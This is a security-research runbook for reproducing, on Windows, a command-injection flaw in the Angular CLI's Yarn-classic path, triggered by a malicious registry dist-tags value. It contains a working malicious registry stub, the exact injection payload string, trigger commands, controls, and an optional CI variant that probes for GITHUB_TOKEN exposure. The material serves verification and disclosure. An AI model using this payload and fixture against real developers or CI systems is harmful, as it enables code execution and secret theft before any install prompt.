# W1 — Windows E2E: OPERATOR RUNBOOK (wave-D planner deliverable, 2026-08-15)

Grounded in: `findings/W1-yarn-classic-disttags-win32/WINDOWS-E2E-FIXTURE.md` (spec),
`findings/W1-yarn-classic-disttags-win32/REPORT.md` (mechanism + trigger ordering),
`payload-proposals/w1poc/OUTPUT.txt` (the exact win32 shell-string shapes). All artifacts are
synthetic; **no real registry, no real credentials, no network beyond localhost**.

---

## 0. What this run proves (one sentence)

That on Windows, an attacker-controlled registry `dist-tags` value executes a command via
`ng add`/`ng update` — **before** the install-confirmation gate and **before** `node_modules` is
touched — closing the single evidence-grade gap the finding currently declares
(execution-observed rung; everything else is source-verified).

## 1. Prerequisites (verify ALL before starting)

| # | Prereq | Check |
|---|---|---|
| 1 | Windows 10/11 x64, default shell `cmd.exe` (PowerShell works but the spawn uses `cmd.exe`; run the fixture from cmd) | `echo %COMSPEC%` |
| 2 | Node LTS 24.x on PATH | `node --version` → v24.x |
| 3 | **Yarn 1.x** on PATH and the ONLY yarn (`yarn --version` → `1.x`; a 2+/berry binary silently falls through to yarn-modern = no injection) | `yarn --version` |
| 4 | `@angular/cli` at the pin `d827ba9005b86b23d05ee7c62c0823367aa245c1` (build from the repo checkout at that commit, or `npx @angular/cli@<pinned-commit-build>` — do NOT use a newer release: the mechanism is pin-specific) | `ng version` |
| 5 | `git`, and no proxy interfering with `127.0.0.1` | — |
| 6 | The fixture dir on a path WITHOUT spaces (keeps the shell-string math unambiguous for triage) | e.g. `C:\w1fixture` |

## 2. Fixture assembly

### 2a. Malicious registry stub (choose ONE)

**Option A — tiny Node http server** (preferred; ~80 lines, log every request):

```js
// registry-server.mjs  (run: node registry-server.mjs 127.0.0.1 4873)
import http from 'node:http';
const MALICIOUS = '1.0.0" & echo W1-POC-MARKER-4f7c2a > %TEMP%\\w1-poc & "';
const meta = (name) => JSON.stringify({
  name, 'dist-tags': { latest: MALICIOUS },
  versions: { '1.0.0': { name, version: '1.0.0', dist: { tarball: `http://127.0.0.1:4873/${name}/-/${name}-1.0.0.tgz` } } },
});
http.createServer((req, res) => {
  console.log(req.method, req.url);
  const name = decodeURIComponent((req.url || '').split('?')[0].replace(/^\/|\.json$/g, ''));
  res.setHeader('content-type', 'application/json');
  res.end(meta(name));
}).listen(4873, '127.0.0.1');
```

**Option B — verdaccio** with a published test package carrying the malicious `dist-tags` value
(heavier; only if A is unavailable).

### 2b. Fixture project (`C:\w1fixture\proj`)

1. `package.json` with a dependency on the test package:
   ```json
   { "name": "w1-proj", "private": true, "dependencies": { "attacker-pkg": "latest" } }
   ```
2. `yarn.lock` present (any valid lock — its presence + Yarn<2 is what selects yarn-classic in
   `factory.ts:99-107`).
3. **`.yarnrc` with Yarn-1 syntax** (NOT bare `registry ...`):
   ```
   --registry http://127.0.0.1:4873
   ```
   All commands run FROM `C:\w1fixture\proj` (the yarn subprocess inherits `process.cwd()` and
   reads the project `.yarnrc` — host.ts:164).
4. Optional `.npmrc` (same `registry=...`) if also testing the ng-update npm path.

## 3. Execution (from `C:\w1fixture\proj`, in cmd.exe)

### 3a. Positive: `ng add` (yarn-classic metadata path)

```
del %TEMP%\w1-poc 2>nul
ng add attacker-pkg
```
Expected: marker file `%TEMP%\w1-poc` EXISTS, and **no install happened** (see §4).

### 3b. Positive: `ng update` (manager-independent path — npm default also fires)

```
del %TEMP%\w1-poc 2>nul
ng update attacker-pkg@latest
```
Expected: marker EXISTS; no confirmation prompt in this flow at all (update has no gate).

### 3c. Additional trigger surfaces (same fixture)

- `ng add attacker-pkg` twice more — the second/third triggers at `add/cli.ts:363` and `:458`.
- Non-TTY: run `ng add attacker-pkg < nul` — the metadata fetch (and injection) fires BEFORE the
  "No terminal detected" abort at the confirmation task (add/cli.ts:520-531 fetch precedes
  :570 confirmation).

### 3d. Controls (must run in the SAME fixture dir, registry swapped)

| Control | Registry value | Expected |
|---|---|---|
| Benign value | `"latest": "1.0.0"` | NO marker; install proceeds normally (or TTY abort) |
| npm/pnpm descriptors | same fixture with `node_modules/.bin` manager switched | NO marker (value path skipped — `requiresManifestVersionLookup` is yarn-classic-only for the add path) |
| POSIX | identical fixture on Linux/macOS | NO marker (array-spawn — negative for this host) |

## 4. Expected markers & ordering proof (what counts as PASS)

1. **Marker file** `%TEMP%\w1-poc` contains `W1-POC-MARKER-4f7c2a` (or the registry log shows the
   joined command line with the injected `& echo ...` clause).
2. **Pre-gate**: the marker appears BEFORE any `? Would you like to proceed` prompt (and before the
   non-TTY abort, if the `< nul` variant is used).
3. **Pre-install**: `node_modules` does NOT contain the test package at marker time; the registry
   log shows the metadata fetch (`GET /attacker-pkg`) but NO `GET /attacker-pkg/-/...tgz` before
   the marker line.
4. **The confirmation UI shows the tag NAME, not the value**: the prompt displays `attacker-pkg@latest`
   — capture a screenshot/transcript line as proof the value was invisible to the user.
5. **Controls all negative** (§3d) — required for the run to be accepted as evidence.

Cross-check against the on-file shell-string proof (`payload-proposals/w1poc/OUTPUT.txt`):
CASE A (malicious) shows the exact joined string
`yarn info --json --verbose "attacker-pkg@1.0.0" & echo W1-POC-MARKER-4f7c2a & ""` with the marker
as a standalone line; the Windows run must reproduce the marker via the SAME joined-string shape
(host.ts:157-164 `spawn(joined, {shell:true})`, `requiresQuoting` at host.ts:110).

## 5. Failure triage

| Symptom | Likely cause | Fix |
|---|---|---|
| No marker, normal install | Yarn 2+ on PATH (factory picks yarn-modern) | Ensure ONLY Yarn 1.x (`yarn --version` → 1.x) |
| No marker + "Invalid package name"/parse error | Registry returned non-JSON or the manifest lacks `versions` | Fix the stub (check `registry-server.mjs` log) |
| No marker + "Registry not found" | `.yarnrc` syntax wrong (bare `registry` instead of `--registry`) | Use `--registry http://127.0.0.1:4873` |
| Marker created but AFTER a prompt | Wrong ordering (confirmInstallationTask ran first — shouldn't happen at the pin) | Verify the pin build (`ng version` → `d827ba9005…`); do not use a newer CLI |
| `yarn --version` hangs/error | PATH contamination | `where yarn`; run from cmd with a clean PATH |
| Marker absent in non-TTY run | The `< nul` redirect swallowed cmd output but the fetch still ran | Check the registry log for `GET /attacker-pkg` BEFORE the abort line |
| Shell string split differently (marker in the yarn stdout, not standalone) | cmd `/c` quoting nuance | Capture the full terminal transcript; the standalone-line requirement is from the POSIX stub — on real cmd the marker appears as its own command output |
| Firewall/proxy blocks 127.0.0.1 | Local proxy settings | Set `NO_PROXY=127.0.0.1` or disable proxy for the run |

## 6. Result reporting format (fill and return to the orchestrator)

```json
{
  "run_id": "w1-e2e-<date>-<operator>",
  "host": { "os": "Windows 10/11", "node": "<v24.x>", "yarn": "<1.x>", "cli_pin": "d827ba9005" },
  "registry": "option-A/option-B",
  "positive_add": { "marker": true/false, "pre_gate": true/false, "pre_install": true/false, "registry_log": "<path>" },
  "positive_update": { "marker": true/false, "pre_gate": true/false },
  "additional_triggers": { "second": true/false, "third": true/false },
  "non_tty": { "marker": true/false, "fetch_before_abort": true/false },
  "controls": { "benign": "negative", "npm_descriptor": "negative", "posix": "negative" },
  "transcript": "<path to full cmd transcript>",
  "verdict": "confirmed_observed / failed (triage above)"
}
```

## 7. Cleanup (always)

- `del %TEMP%\w1-poc` (marker), remove `C:\w1fixture`, stop the registry stub, remove any
  verdaccio config. Nothing persists outside the fixture dir; no real credentials were used.

## 8. Optional CI-runner variant (only if the operator wants the fork-PR secret-reach rung)

Same fixture on a `windows-latest` runner inside a private repo CI job that runs
`ng add attacker-pkg` on the PR checkout (config-as-data shape): the marker proves injection, and
capturing `%GITHUB_ENV%`/`$env:GITHUB_TOKEN` presence at marker time documents the env-inheritance
claim — but this requires the wire-2 private-repo step (operator confirmation at the moment of the
act; cleanup: delete the repo + workflow runs). The local run (§3) is fully sufficient for the
mechanism rung.

## 9. Safety notes

Local-only, synthetic registry, no live npm/Google/Angular systems, no real credentials. The
injected command is an echo-marker (no `calc`), so the run is CI-safe and headless-safe.
